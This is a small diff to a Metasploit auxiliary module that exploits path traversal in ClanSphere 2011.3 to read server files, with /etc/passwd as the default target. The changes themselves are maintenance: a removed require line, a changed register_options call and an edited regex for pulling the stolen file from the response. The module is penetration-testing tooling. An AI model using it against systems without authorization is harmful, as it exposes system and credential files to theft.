@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
@@ -38,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'The URI path to the web application', '/clansphere_2011.3/']),
         OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
         OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
-      ], self.class)
+      ])
   end
 
 
@@ -67,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
 
     elsif res and res.code == 200
       pattern_end = "     UTC +1 - Load:"
-      data = res.body.scan(/\<div id\=\"bottom\"\>\n(.+)\n\x20{5}UTC.+/m).flatten[0].lstrip
+      data = res.body.scan(/\<div id\=\"bottom\"\>\n(.+)\n\x20{5}UTC/).flatten[0].lstrip
       fname = datastore['FILE']
       p = store_loot(
         'clansphere.cms',
